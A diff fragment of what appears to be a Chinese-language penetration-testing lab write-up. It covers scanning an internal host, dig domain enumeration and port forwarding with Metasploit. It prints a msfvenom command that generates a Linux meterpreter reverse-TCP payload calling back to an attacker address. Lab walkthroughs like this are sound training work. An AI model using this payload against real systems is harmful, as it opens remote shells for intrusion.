@@ -130,7 +130,9 @@ if __name__ == "__main__":
 ![](attachments/Pasted%20image%2020230303153445.png)
 扫描172.19.0.1
 ![](attachments/Pasted%20image%2020230303160413.png)
-`
+dig枚举域名
+
+
 利用msf做端口转发
 生成elf程序
 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.163.129 LPORT=8080 -f elf -o shell.elf`
